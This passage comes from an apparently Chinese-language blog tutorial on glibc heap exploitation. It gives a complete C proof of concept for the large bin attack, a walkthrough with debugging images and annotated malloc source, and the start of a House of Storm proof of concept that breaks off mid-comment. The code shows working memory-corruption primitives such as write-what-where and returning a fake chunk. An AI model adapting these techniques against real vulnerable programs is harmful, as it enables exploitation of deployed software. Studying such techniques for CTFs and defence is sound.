class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    <span class="built_in">assert</span>(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">assert</span>(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>large bin 结构图。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VFQNFY7QR4V8CRG-1695379768564-24.webp"
                      alt="图片描述"
                ></p>
<ol>
<li>大于 0x400 的 chunk 属于 large bin 范畴。</li>
<li>fd -&gt; 后一个大小相同的 chunk，bk 指向前一个大小相同的 chunk。</li>
<li>fd_nextsize -&gt; 比他小的最大heap。</li>
<li>bk_nextsize -&gt; 比他大的最小的heap。</li>
<li>最后将两条链条首尾相连。</li>
</ol>
<h3 id="调试-12"><a href="#调试-12" class="headerlink" title="调试"></a>调试</h3><p>首先栈上放置两个值为 0 的栈变量。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B9PMX7Y6BUNXX68-1695379746623-20.webp"
                      alt="图片描述"
                ><br>然后布置如下结构的堆。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NTGAR62F4NUUEPD-1695379792691-27.webp"
                      alt="图片描述"
                ><br>依次释放 non-fast 大小的 p1, p2，它们将会被挂到 unsorted bin 。并且 p2-&gt;p1 。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PH5MQPBFFHH6UWF-1695379744185-16.webp"
                      alt="图片描述"
                ><br>此时申请 0x90 大小的堆块将会遍历 unsorted bin , 但 unsorted bin 中并无正好合适的 chunk 。所以会切割先进来的 p1 成为 last_remainder 留在 unsorted bin，并把 p2 放进 large bin 。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KMUDJ58864BVGRJ-1695379733565-12.webp"
                      alt="图片描述"
                ><br>之后 free(p3)，p3 进入 unsorted bin , p3-&gt;p1。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R56GD8898CAHVC-1695379732363-10.webp"
                      alt="图片描述"
                ><br>然后如下修改 p2 的结构，让 p3_size &gt; p2_size ，以便后续利用。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C845XWYM8RY6FP2-1695379729718-6.webp"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FSXFTBKCRMVYT59-1695379728616-4.webp"
                      alt="图片描述"
                ><br>此时 p2 结构如下。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NWAPT4CW7S4UWB8-1695379724638-1.webp"
                      alt="图片描述"
                ><br>再次申请 0x90 大小的堆块，将会再次遍历 unsorted bin 。将 p1 切割，将 p3 放进 unsorted bin 。<br>放入过程中如果 p3_size &gt; p2_size 。将会执行如下代码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 源码 */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    </span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="comment">/* “译”码 */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    P3-&gt;fd_nextsize = P2;</span><br><span class="line">    P3-&gt;bk_nextsize = P2-&gt;bk_nextsize; </span><br><span class="line">    P2-&gt;bk_nextsize = P3;</span><br><span class="line">    P3-&gt;bk_nextsize-&gt;fd_nextsize = P3; </span><br><span class="line">&#125;</span><br><span class="line">bck = P2-&gt;bk;</span><br></pre></td></tr></table></figure></div>
<p>即 stack_var2 &#x3D; p3。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 源码 */</span></span><br><span class="line"><span class="built_in">mark_bin</span> (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="comment">/* “译”码 */</span></span><br><span class="line"><span class="built_in">mark_bin</span>(av, victim_index);</span><br><span class="line">P3-&gt;bk = p2-&gt;bk;</span><br><span class="line">P3-&gt;fd = P2;</span><br><span class="line">P2-&gt;bk = P3;</span><br><span class="line">bck-&gt;fd = P3; <span class="comment">// bck 是原p2-&gt;bk(见上一段代码的bck)</span></span><br></pre></td></tr></table></figure></div>
<p>即 stack_var1 &#x3D; p3，至此利用完成，具体如何利用可看例题。</p>
<h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><p><code>glibc &lt; 2.29</code>，例题 <code>heap2storm</code> 结合 <code>ptmalloc</code> 源码讲的更为详细一些，这里简化了很多。</p>
<h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC for House of Storm on 2.23</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">For 2.26-2.28, the tcache will need to</span></span><br><span class="line"><span class="comment">be full for this to work. After this,</span></span><br><span class="line"><span class="comment">a patch to the unsorted bin attack likely prevents this</span></span><br><span class="line"><span class="comment">technique from working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This technique uses a combination of editing</span></span><br><span class="line"><span class="comment">the unsorted bin chunk and the large bin chunks</span></span><br><span class="line"><span class="comment">to write a &#x27;size&#x27; to a user choosen address in memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Once this has occurred, if the size at this &#x27;fake&#x27;</span></span><br><span class="line"><span class="comment">location is the same size as the allocation,</span></span><br><span class="line"><span class="comment">then the chunk will be returned back to the user.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack allows arbitrary chunks to be returned</span></span><br><span class="line"><span class="comment">to the user!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Written by Maxwell &quot;Strikeout&quot; Dulin</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filler[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">char</span> target[<span class="number">0x60</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// clearenv();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the AMOUNT to shift over for size and the offset on the largebin.</span></span><br><span class="line"><span class="comment">// Needs to be a valid minimum sized chunk in order to work.</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_shift_amount</span><span class="params">(<span class="type">char</span>* pointer)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> shift_amount = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ptr = (<span class="type">long</span> <span class="type">long</span>)pointer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ptr &gt; <span class="number">0x20</span>)&#123;</span><br><span class="line">                ptr = ptr &gt;&gt; <span class="number">8</span>;</span><br><span class="line">                shift_amount += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shift_amount - <span class="number">1</span>; <span class="comment">// Want amount PRIOR to this being zeroed out</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *unsorted_bin, *large_bin, *fake_chunk, *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;House of Storm&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Preparing chunks for the exploit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Put one chunk into unsorted bin and the other into the large bin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The unsorted bin chunk MUST be larger than the large bin chunk.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Putting a chunk into the unsorted bin and another</span></span><br><span class="line"><span class="comment">	into the large bin.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span> ( <span class="number">0x4e8</span> );  <span class="comment">// size 0x4f0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// prevent merging</span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Find the proper chunk size to allocate.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Must be exactly the size of the written chunk from above.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Find the proper size to allocate</span></span><br><span class="line"><span class="comment">	We are using the first &#x27;X&#x27; bytes of the heap to act</span></span><br><span class="line"><span class="comment">	as the &#x27;size&#x27; of a chunk. Then, we need to allocate a</span></span><br><span class="line"><span class="comment">	chunk exactly this size for the attack to work.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	So, in order to do this, we have to take the higher</span></span><br><span class="line"><span class="comment">	bits of the heap address and allocate a chunk of this</span></span><br><span class="line"><span class="comment">	size, which comes from the upper bytes of the heap address.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	<span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">	- This does have a 1/2 chance of failing. If the 4th bit</span></span><br><span class="line"><span class="comment">	of this value is set, then the size comparison will fail.</span></span><br><span class="line"><span class="comment">	- Without this calculation, this COULD be brute forced.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="type">int</span> shift_amount = <span class="built_in">get_shift_amount</span>(unsorted_bin);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shift Amount: %d\n&quot;</span>, shift_amount);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> alloc_size = ((<span class="type">size_t</span>)unsorted_bin) &gt;&gt; (<span class="number">8</span> * shift_amount);</span><br><span class="line">        <span class="keyword">if</span>(alloc_size &lt; <span class="number">0x10</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Chunk Size: 0x%lx\n&quot;</span>, alloc_size);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Chunk size is too small&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        alloc_size = (alloc_size &amp; <span class="number">0xFFFFFFFFE</span>) - <span class="number">0x10</span>; <span class="comment">// Remove the size bits</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In this case, the chunk size is 0x%lx\n&quot;</span>, alloc_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Checks to see if the program will crash or not</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        The fourth bit of the size and the &#x27;non-main arena&#x27; chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438</span></span><br><span class="line"><span class="comment">        validates to see if ONE of the following cases is true:</span></span><br><span class="line"><span class="comment">        - av == arena_for_chunk (mem2chunk (mem))</span></span><br><span class="line"><span class="comment">        - chunk is mmaped</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        If the &#x27;non-main arena&#x27; bit is set on the chunk, then the</span></span><br><span class="line"><span class="comment">        first case will fail.</span></span><br><span class="line"><span class="comment">        If the mmap bit is set, then this will pass.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        So, either the arenas need to match up (our fake chunk is in the</span></span><br><span class="line"><span class="comment">        .bss section for this demo. So, clearly, this will not happen) OR</span></span><br><span class="line"><span class="comment">        the mmap bit must be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The logic below validates that the fourth bit of the size</span></span><br><span class="line"><span class="comment">        is NOT set and that either the mmap bit is set or the non-main</span></span><br><span class="line"><span class="comment">        arena bit is NOT set. If this is the case, the exploit should work.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span>((alloc_size &amp; <span class="number">0x8</span>) != <span class="number">0</span> || (((alloc_size &amp; <span class="number">0x4</span>) == <span class="number">0x4</span>) &amp;&amp; ((alloc_size &amp; <span class="number">0x2</span>) != <span class="number">0x2</span>)))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Allocation size has bit 4 of the size set or &quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;mmap and non-main arena bit check will fail&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Please try again! :)&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	large_bin  =  <span class="built_in">malloc</span> ( <span class="number">0x4d8</span> );  <span class="comment">// size 0x4e0</span></span><br><span class="line">	<span class="comment">// prevent merging</span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIFO</span></span><br><span class="line">	<span class="built_in">free</span> ( large_bin );  <span class="comment">// put small chunks first</span></span><br><span class="line">	<span class="built_in">free</span> ( unsorted_bin );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Put the &#x27;large bin&#x27; chunk into the large bin</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x4e8</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, there is a single chunk in the</span></span><br><span class="line"><span class="comment">	large bin and a single chunk in the unsorted bin.</span></span><br><span class="line"><span class="comment">	It should be noted that the unsorted bin chunk</span></span><br><span class="line"><span class="comment">	should be LARGER in size than the large bin chunk</span></span><br><span class="line"><span class="comment">	but should still be within the same bin.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In this setup, the large_bin has a chunk</span></span><br><span class="line"><span class="comment">	of size 0x4e0 and the unsorted bin</span></span><br><span class="line"><span class="comment">	has a chunk of size 0x4f0. This technique relies on</span></span><br><span class="line"><span class="comment">	the unsorted bin chunk being added to the same bin</span></span><br><span class="line"><span class="comment">	but a larger chunk size. So, careful heap feng shui</span></span><br><span class="line"><span class="comment">	must be done.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The address that we want to write to!</span></span><br><span class="line">	fake_chunk = target - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Vulnerability! Overwrite unsorted bins &#x27;bk&#x27; pointer with our target location.\n This is our target location to get from the allocator&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The address of our fake chunk is set to the unsorted bin</span></span><br><span class="line"><span class="comment">	chunks &#x27;bk&#x27; pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This launches the &#x27;unsorted_bin&#x27; attack but it is NOT the</span></span><br><span class="line"><span class="comment">	main purpose of us doing this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After launching the &#x27;unsorted_bin attack&#x27; the &#x27;victim&#x27; pointer</span></span><br><span class="line"><span class="comment">	will be set to THIS address. Our goal is to find a way to get</span></span><br><span class="line"><span class="comment">	this address from the allocator.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Vulnerability!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Only needs to be a valid address.</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;of your fake chunk.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Misalign the location in order to use the primitive as a SIZE value.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The &#x27;offset&#x27; changes depending on if the binary is PIE (5) or not PIE (2).&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Vulnerability #2!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This can be seen as a WRITE-WHERE primitive in the large bin.</span></span><br><span class="line"><span class="comment">	However, we are going to write a &#x27;size&#x27; for our fake chunk using this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	So, we set https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579</span></span><br><span class="line"><span class="comment">	to an address for our fake size. The write above (bk_nextsize) is</span></span><br><span class="line"><span class="comment">	controlled via the pointer we are going to overwrite below. The</span></span><br><span class="line"><span class="comment">	value that gets written is a heap address; the unsorted bin</span></span><br><span class="line"><span class="comment">	chunk address above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The &#x27;key&#x27; to this is the offset. First, we subtract 0x18 because</span></span><br><span class="line"><span class="comment">	this is the offset to writting to fd_nextsize in the code shown</span></span><br><span class="line"><span class="comment">	above. Secondly, notice the -2 below. We are going</span></span><br><span class="line"><span class="comment">	to write a &#x27;heap address&#x27; at a mis-aligned location and</span></span><br><span class="line"><span class="comment">	use THIS as the size. For instance, if the heap address is 0x123456</span></span><br><span class="line"><span class="comment">	and the pointer is set to 0x60006. This will write the following way:</span></span><br><span class="line"><span class="comment">	- 0x60006: 0x56</span></span><br><span class="line"><span class="comment">	- 0x60007: 0x34</span></span><br><span class="line"><span class="comment">	- 0x60008: 0x12</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, our &#x27;fake size&#x27; is at 0x60008 and is a valid size for the</span></span><br><span class="line"><span class="comment">	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk</span></span><br><span class="line"><span class="comment">	from the allocator.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Second 